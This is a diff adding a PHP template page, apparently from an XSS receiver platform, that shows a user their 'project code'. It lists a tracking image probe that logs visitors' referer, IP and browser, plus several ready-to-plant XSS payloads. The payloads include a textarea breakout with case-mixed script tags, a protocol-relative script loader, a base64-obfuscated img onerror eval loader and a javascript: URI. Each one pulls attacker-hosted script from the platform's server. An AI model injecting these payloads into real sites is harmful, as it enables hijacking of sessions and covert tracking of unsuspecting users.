@@ -1,0 +1,57 @@
+{extend name='common/layout' /}
+{block name='title'}<title>{$title}</title>{/block}
+{block name='content'}
+<div class="row">
+    <div class="col-md-8 col-md-offset-2">
+        <div class="row">
+            {include file='common/left' /}
+            <div class="col-md-9">
+                <div class="panel panel-default">
+                    <!-- Default panel contents -->
+                    <div class="panel-heading">
+                        项目代码
+                    </div>
+                    <div class="panel-body">
+                        <h3>项目名称：{$project['title']}</h3>
+                        <br>
+                        <label>如何使用：</label>
+                        <p>
+                            图片探针（记录referer、IP、浏览器等信息）
+                            <pre>http://{:config('siteconfig.url')}/{$project['urlkey']}.jpg</pre>
+                        </p>
+                        <p>
+                            将如下代码植入怀疑出现xss的地方（注意'的转义），即可在 <a href="{:url('index/project/index',['id'=>$project['id']])}">项目内容</a> 观看XSS效果。
+                        <pre>&lt;/tExtArEa&gt;'"&gt;&lt;sCRiPt sRC=http://{:config('siteconfig.url')}/{$project['urlkey']}&gt;&lt;/sCrIpT&gt;</pre>
+                        </p>
+                        <p>
+                            或者
+                        <pre>&lt;sCRiPt sRC=http://{:config('siteconfig.url')}/{$project['urlkey']}&gt;&lt;/sCrIpT&gt;</pre>
+                        </p>
+                        <p>
+                            再或者以你任何想要的方式插入
+                        <pre>http://{:config('siteconfig.url')}/{$project['urlkey']}</pre>
+                        </p>
+                        <p>
+                            再或者以https,http双支持的方式插入
+                        <pre>&lt;script src=//{:config('siteconfig.url')}/{$project['urlkey']}&gt;&lt;/script&gt;</pre>
+                        </p>
+                        <p>
+                            ↓↓↓！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)↓↓↓
+                        <pre>&lt;sCRiPt/SrC=//{:config('siteconfig.url')}/{$project['urlkey']}&gt;</pre>
+                        </p>
+                        <p>
+                            再或者以你任何想要的方式插入
+                        <pre class="pre-class">&lt;img src=x onerror=eval(atob('{:base64_encode("s=createElement('script');body.appendChild(s);s.src='http://".config('siteconfig.url')."/".$project['urlkey']."?'+Math.random()")}'))&gt;</pre>
+                        </p>
+                        <p>
+                            再或者以https,http双支持的方式插入
+                        <pre class="pre-class">javascript:eval('window.s=document.createElement("script");window.s.src="//{:config('siteconfig.url')}/{$project['urlkey']}";document.body.appendChild(window.s)')</pre>
+                        </p>
+                        <button type="button" class="btn btn-success" onclick="history.go(-1)">返回</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{/block}
